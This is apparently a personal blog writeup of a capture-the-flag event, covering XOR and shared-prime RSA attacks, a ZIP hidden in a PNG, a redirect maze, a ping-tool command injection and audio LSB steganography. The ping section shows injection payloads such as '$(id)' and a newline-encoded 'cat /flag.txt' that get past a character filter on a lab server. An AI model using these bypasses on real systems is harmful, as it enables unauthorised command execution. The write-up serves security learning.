---
title: "MYTHX: AN ENDGAME PROTOCOL CTF - Writeup"
date: 2026-03-30
layout: post
categories: [ctf]
tags: [ctf, cybersecurity]
---

Hey everyone,
This is my first CTF writeup. I have done some CTFs before but never actually written any writeups, so excuse my informal writing as this is my personal blog post.

Thank you and enjoy reading....

---

## Cryptography
### XOR Known Plaintext

```
[spirit@archlinux mythx]$ nc 212.2.250.33  31485
XOR Encryption Service
We encrypted our secret message with military-grade XOR encryption.
ciphertext_hex = 5b2f9578dc40348110d55d389c39c24a3e9710cc5d22ac7ec65e39ca29c40d26
Good luck decrypting it!

Commands: ENCRYPT <hex>, QUIT
```
Here we got the ***ciphertext_hex*** and the algorithm, which uses the same key to XOR every plaintext. To get the key value we have to send a block of all zeros the same length as the ciphertext:
```bash
ENCRYPT 0000000000000000000000000000000000000000000000000000000000000000
```
Then we get the value of the ***KEY***.
Then we just have to XOR the KEY with the ciphertext_hex:

**plaintext = ciphertext ⊕ key**

Use [encryptdecrypt.tools](https://encryptdecrypt.tools/tools/ciphers/xor.php) or [cyberchef.org](https://cyberchef.org/#recipe=XOR(%7B'option':'Hex','string':''%7D,'Standard',false)) to get the flag.

### RSA Common Factor
```
[spirit@archlinux mythx]$ nc 212.2.250.33 31546
RSA Challenge — Two keys, one secret
n1 = 0x7e870a4b889c19900c4868a8cbe9b5055f0d5684d013a11ecd931e41a20d4e59be34796ad9ec0e4b1c41a070779aa7d39392b48cdf72eea87892d13be87824ad77bfed58bb175c97d4e4e0481b76c1ebbf7dfee03523537ec604110de2fdd336e66b1fc570b9eca543562c6bbd39e90cc9c83949950ed327bbc70f987bb8f3a3
e1 = 65537
n2 = 0x726d514f3c60075d6f10133554b670c1d5776134e05437782a7a708ae78b68639d46a9c45b5942995254f1294e0f8d6ba587deb6d5a3c40e0ad6670e7203be40688d60d8a7b2f8bda6add4d99db7d27df57a7d4af0bcb4f6ae2f9413d7652b9a61f0adc4959253b65f75c5e6e1ec0b71a2283a3b6bc3c3fd70f06023c6f331e7
e2 = 65537
ciphertext = 0x3409030a583eccba7e1401071e55fa60c488f2f7921de3446569d55b1d6e50de11a646f0ffbcc7c19fbd06867389ae6a9bb004b1d5b96c2ada4dee1ee0c60bee73fc7b92c4eaef1f65340761532304a047ce7b1a5f3427e25124a53c30c603046a32b99d1cf526a02a930af774133a4bba91a2132df8009d9b7ef611376f37ea
Decrypt the flag.
```
We are given that they are using shared primes:

**n1 = p * q1  
  n2 = p * q2**
  
Therefore **gcd(n1, n2) = p**

```bash
from math import gcd

n1 = int("7e870a4b889c19900c4868a8cbe9b5055f0d5684d013a11ecd931e41a20d4e59be34796ad9ec0e4b1c41a070779aa7d39392b48cdf72eea87892d13be87824ad77bfed58bb175c97d4e4e0481b76c1ebbf7dfee03523537ec604110de2fdd336e66b1fc570b9eca543562c6bbd39e90cc9c83949950ed327bbc70f987bb8f3a3", 16)
n2 = int("726d514f3c60075d6f10133554b670c1d5776134e05437782a7a708ae78b68639d46a9c45b5942995254f1294e0f8d6ba587deb6d5a3c40e0ad6670e7203be40688d60d8a7b2f8bda6add4d99db7d27df57a7d4af0bcb4f6ae2f9413d7652b9a61f0adc4959253b65f75c5e6e1ec0b71a2283a3b6bc3c3fd70f06023c6f331e7", 16)

p = gcd(n1, n2)
print("p =", p)
```
**Complete Python code for solving:**
```bash
## Compute GCD
from math import gcd

n1 = int("7e870a4b889c19900c4868a8cbe9b5055f0d5684d013a11ecd931e41a20d4e59be34796ad9ec0e4b1c41a070779aa7d39392b48cdf72eea87892d13be87824ad77bfed58bb175c97d4e4e0481b76c1ebbf7dfee03523537ec604110de2fdd336e66b1fc570b9eca543562c6bbd39e90cc9c83949950ed327bbc70f987bb8f3a3", 16)
n2 = int("726d514f3c60075d6f10133554b670c1d5776134e05437782a7a708ae78b68639d46a9c45b5942995254f1294e0f8d6ba587deb6d5a3c40e0ad6670e7203be40688d60d8a7b2f8bda6add4d99db7d27df57a7d4af0bcb4f6ae2f9413d7652b9a61f0adc4959253b65f75c5e6e1ec0b71a2283a3b6bc3c3fd70f06023c6f331e7", 16)

p = gcd(n1, n2)
print("p =", p)
## Recover q
q1 = n1 // p
## Compute private key
e = 65537

phi = (p - 1) * (q1 - 1)
d = pow(e, -1, phi)
## Decrypt ciphertext    
c = int("3409030a583eccba7e1401071e55fa60c488f2f7921de3446569d55b1d6e50de11a646f0ffbcc7c19fbd06867389ae6a9bb004b1d5b96c2ada4dee1ee0c60bee73fc7b92c4eaef1f65340761532304a047ce7b1a5f3427e25124a53c30c603046a32b99d1cf526a02a930af774133a4bba91a2132df8009d9b7ef611376f37ea", 16)

m = pow(c, d, n1)

# Convert to bytes
flag = m.to_bytes((m.bit_length() + 7) // 8, 'big')
print(flag)
```
RSA completely breaks if two moduli share a prime:
- GCD reveals the shared prime instantly
- No brute force needed


```
(venv) [spirit@archlinux rsacommonfactor]$ python3 solve.py 
[+] p found: 12572875077367186704735077573535227403192141796822752158471799682324640181504885170215242914740349156995517595514640649547505570363388043623610992784411651
[+] q found: 7066850829407554063056610368489813768737443204087258911948976889051688982667585782793902509464286106865865632932997443297332056660173206716831099113109473
[+] d computed

[+] Raw plaintext:
b'ctf7{reused_prime_disaster_81e9db4c}'

[+] Decoded flag:
ctf7{reused_prime_disaster_81e9db4c}
```


## Forensics
### Hidden ZIP in PNG

In this challenge I got a .png file:
```bash
[spirit@archlinux hiddenzip]$ exiftool challenge.png
ExifTool Version Number         : 13.50
File Name                       : challenge.png
Directory                       : .
File Size                       : 21 kB
File Modification Date/Time     : 2026:03:28 22:10:36+05:30
File Access Date/Time           : 2026:03:30 09:11:44+05:30
File Inode Change Date/Time     : 2026:03:28 22:14:59+05:30
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 100
Image Height                    : 100
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Comment                         : password=ctf72026
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 100x100
Megapixels                      : 0.010
```
`exiftool` revealed the password to the ZIP file: **password=ctf72026**
```
[spirit@archlinux hiddenzip]$ binwalk challenge.png                                                                                             
/home/spirit/Desktop/mythx/hiddenzip/challenge.png
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
DECIMAL                            HEXADECIMAL                        DESCRIPTION
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
0                                  0x0                                PNG image, total size: 21236 bytes 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
Analyzed 1 file for 85 file signatures (187 magic patterns) in 4.0 milliseconds 
[spirit@archlinux hiddenzip]$ hexdump -C challenge.png | grep "50 4b" 
000052f0  ae 42 60 82 50 4b 03 04  14 00 01 00 63 00 12 85  |.B`.PK......c...| 
00005360  50 4b 01 02 14 03 14 00  01 00 63 00 12 85 7c 5c  |PK........c...|\| 
000053a0  00 50 4b 05 06 00 00 00  00 01 00 01 00 41 00 00  |.PK..........A..| 
[spirit@archlinux hiddenzip]$ ls 
challenge.png  generate_artifact.py  server.py 
```

```bash
# Extract the ZIP starting at byte 21236
dd if=challenge.png of=hidden.zip bs=1 skip=21236

# Now unzip with the password you found
unzip -P ctf72026 hidden.zip

# Read the flag
cat flag.txt
```
```bash
[spirit@archlinux hiddenzip]$ cat flag.txt 
ctf7{zip_in_hidden_0e8f0b22}
```
We have successfully found the flag.

NOTE: I tried using `binwalk` but was unable to extract using it.


## Web
### Redirect Maze

I don't have a screenshot of the challenge but here is the workflow:

- Step 1: Open Burp Suite
- Step 2: Open the challenge URL given
- Step 3: Open the Proxy tab and check under Proxy History to investigate the redirects
- Step 4: In each redirect there is a part of the flag — across 5 redirects we just have to append each part together starting from the first redirect
- Step 5: Submit the flag that was found

I think this is the easiest challenge of them all.

### Ping Tool

I used Burp Suite for this challenge but I only have the curl output, so...

First I tried using the IP `8.8.8.8` to check the request. It showed that it adds `ip=8.8.8.8` and also gives the normal expected output.

```bash
[spirit@archlinux pingtool]$ curl 'http://chall-513f92b1.evt-246.glabs.ctf7.com/ping' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://chall-513f92b1.evt-246.glabs.ctf7.com' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://chall-513f92b1.evt-246.glabs.ctf7.com/' \
  -H 'Cookie: _ga_2BLJE20B7V=GS2.1.s1774717706$o3$g1$t1774718273$j47$l0$h0; _ga=GA1.1.273546918.1774688942; _ga_33L5X5T0XC=GS2.1.s1774790742$o9$g1$t1774793790$j60$l0$h0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'DNT: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'ip=8.8.8.8'

<!DOCTYPE html>
<html>
<body>
    <div class="container">
        <h1>$ ping_tool v2.1</h1>
        <p>Enter an IP address to ping:</p>
        <form method="POST" action="/ping">
            <input type="text" name="ip" placeholder="e.g. 8.8.8.8" required>
            <button type="submit">Ping</button>
        </form>
        <p class="waf-notice">WAF enabled: dangerous characters are blocked for your safety.</p>
        
        <h3>Result:</h3>
        <pre>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=2.62 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.616/2.616/2.616/0.000 ms
</pre>
        
    </div>
</body>
</html>
```
```
;, &&, | are blocked — but bypass techniques will work.
```

Then I tried modifying the request by adding something like **ip=127.0.0.1$(id)**.
That gave me the output as localhost and root, which means we can run commands with root privileges.

I modified the request a little to find and reveal the flag:

```
ip=127.0.0.1$(find / -name "*flag*" 2>/dev/null)
```

I used the above request to find the flag location, and then modified the curl request to read it:

```
--data-raw 'ip=127.0.0.1%0acat /flag.txt'
```

With this we have successfully found the flag.


## Steganography
### Suspicious Transmission
Challenge Overview:
- WAV File: Contains a 2-second 440Hz sine wave (A4 note) at 8000 Hz sample rate
- Hidden Data: Flag embedded in the LSB of each 16-bit audio sample
- Encoding: Each character → 8 bits → embedded sequentially, terminated by a null byte (8 zero bits)

```
#!/usr/bin/env python3
import wave
import struct

def extract_lsb(wav_file):
    """Extract LSB from WAV samples and decode to string."""
    with wave.open(wav_file, 'r') as wf:
        num_samples = wf.getnframes()
        raw_data = wf.readframes(num_samples)
        samples = struct.unpack(f"<{num_samples}h", raw_data)
    
    # Extract LSBs
    bits = []
    for sample in samples:
        bits.append(sample & 1)
    
    # Convert bits to bytes
    message = []
    for i in range(0, len(bits), 8):
        byte_bits = bits[i:i+8]
        if len(byte_bits) < 8:
            break
        byte_value = 0
        for bit in byte_bits:
            byte_value = (byte_value << 1) | bit
        
        if byte_value == 0:  # Null terminator
            break
        message.append(chr(byte_value))
    
    return ''.join(message)

if __name__ == "__main__":
    flag = extract_lsb("challenge.wav")
    print(f"Flag: {flag}")

```

We have successfully found the flag.

```
(venv) [spirit@archlinux suspicioustransmissions]$ python3 solve.py 
Flag: ctf7{transmission_succesfull_tha_kya_6d95e6fe}
```
